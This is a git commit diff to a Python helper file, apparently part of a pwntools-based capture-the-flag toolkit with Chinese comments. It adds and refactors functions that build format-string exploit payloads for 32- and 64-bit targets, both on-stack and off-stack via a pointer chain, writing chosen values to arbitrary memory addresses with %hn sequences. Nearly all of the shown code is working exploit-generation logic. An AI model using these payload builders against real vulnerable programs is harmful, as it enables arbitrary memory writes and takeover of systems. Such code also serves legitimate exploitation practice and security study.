4f13ebd53e00d34bbf9bc79da4f7838a53abb21c
TUTo-Y <2219878724@qq.com>
2024-05-17 09:55:58 +0800

    tmp

--- fmtstr/fmtarg.py
+++ fmtstr/fmtarg.py
@@ -36,24 +36,30 @@ def fmtnot64(target, gadget, rsp, offset1, offset2, offset3):
         payload[i + 1], _   = fmt(gadget >> ((i - 1) * 8), offset1)
     return payload
 
+# 32位下的非栈上的格式化字符串漏洞利用
+# 设置任意地址的值, target为目标地址, gadget为要写入的值, esp为栈地址, offset1~3分别是栈上三联的偏移量
+# 0x7fffff01 (offset1) -> bss
+# 0x7fffff02 (offset2) -> 0x7fffff03 (offset3) -> 0x7fffff04 (offset4)
+def fmtnot32(target, gadget, esp, offset1, offset2, offset3):
+    payload = [b'', b'', b'', b'', b'']
+    # 设置offset3 -> offset1
+    payload[0], _   = fmt(esp + offset1 * 4, offset2)
+    for i in [1, 3]:
+        # 设置  offset1 -> target
+        payload[i], _       = fmt(target + i - 1, offset3)
+        # 设置  target  -> gadget
+        payload[i + 1], _   = fmt(gadget >> ((i - 1) * 8), offset1)
+    return payload
+
 # 64位下的栈上的格式化字符串漏洞利用
 # 向target写入gadget, str_offset为字符串的起始位置
-def fmtarg64(target, gadget, str_offset):
+def fmtarg64(target, gadget, str_offset, write_size = 0):
     payload = b''
-    write_size = 0
     for i in range(4):
-        value  = ( gadget >> ( i * 16 ) ) & 0xffff
-        if(value > write_size & 0xffff):
-            num         =   value - ( write_size & 0xffff )
-            write_size  +=  value - ( write_size & 0xffff )
-        else:
-            num         =   value + 0x10000 - ( write_size & 0xffff )
-            write_size  +=  value + 0x10000 - ( write_size & 0xffff )
-        # 0为特殊情况
-        if(num == 0):
-            payload += b'%' + bytes(str(str_offset + 7 + i), 'utf-8') + b'$hn'
-        else:
-            payload += b'%' + bytes(str(num), 'utf-8') + b'c%' + bytes(str(str_offset + 7 + i), 'utf-8') + b'$hn'
+        value   = ( gadget >> ( i * 16 ) ) & 0xffff
+        p, w    = fmt(value, str_offset + 7 + i, write_size)
+        payload += p
+        write_size += w
     payload  = payload.ljust(56, b'a')
     payload += p64(target)
     payload += p64(target + 2)
@@ -63,30 +69,31 @@ def fmtarg64(target, gadget, str_offset):
 
 # 32位下的栈上的格式化字符串漏洞利用
 # 向target写入gadget, str_offset为字符串的起始位置
-def fmtarg32(target, gadget, str_offset):
+def fmtarg32(target, gadget, str_offset, write_size = 0):
     payload = b''
-    write_size = 0
     for i in range(2):
-        value  = ( gadget >> ( i * 16 ) ) & 0xffff
-        if(value > write_size & 0xffff):
-            num         =   value - ( write_size & 0xffff )
-            write_size  +=  value - ( write_size & 0xffff )
-        else:
-            num         =   value + 0x10000 - ( write_size & 0xffff )
-            write_size  +=  value + 0x10000 - ( write_size & 0xffff )
-        # 0为特殊情况
-        if(num == 0):
-            payload += b'%' + bytes(str(str_offset + 7 + i), 'utf-8') + b'$hn'
-        else:
-            payload += b'%' + bytes(str(num), 'utf-8') + b'c%' + bytes(str(str_offset + 7 + i), 'utf-8') + b'$hn'
+        value   = ( gadget >> ( i * 16 ) ) & 0xffff
+        p, w    = fmt(value, str_offset + 7 + i, write_size)
+        payload += p
+        write_size += w
     payload  = payload.ljust(28, b'a')
     payload += p32(target)
     payload += p32(target + 2)
     return payload
 
-# 向target写入gadget, str_offset为字符串的起始位置
-def fmtarg(target, gadget, str_offset):
+# 非栈上的格式化字符串漏洞利用
+# 设置任意地址的值, target为目标地址, gadget为要写入的值, esp为栈地址, offset1~3分别是栈上三联的偏移量
+# 0x7fffff01 (offset1) -> bss
+# 0x7fffff02 (offset2) -> 0x7fffff03 (offset3) -> 0x7fffff04 (offset4)
+def fmtnot(target, gadget, sp, offset1, offset2, offset3):
     if context.arch == 'i386':
-        return fmtarg32(target, gadget, str_offset)
+        return fmtnot32(target, gadget, sp, offset1, offset2, offset3)
     else:
-        return fmtarg64(target, gadget, str_offset)
+        return fmtnot64(target, gadget, sp, offset1, offset2, offset3)
+
+# 向target写入gadget, str_offset为字符串的起始位置
+def fmtarg(target, gadget, str_offset, write_size = 0):
+    if context.arch == 'i386':
+        return fmtarg32(target, gadget, str_offset, write_size)
+    else:
+        return fmtarg64(target, gadget, str_offset, write_size)
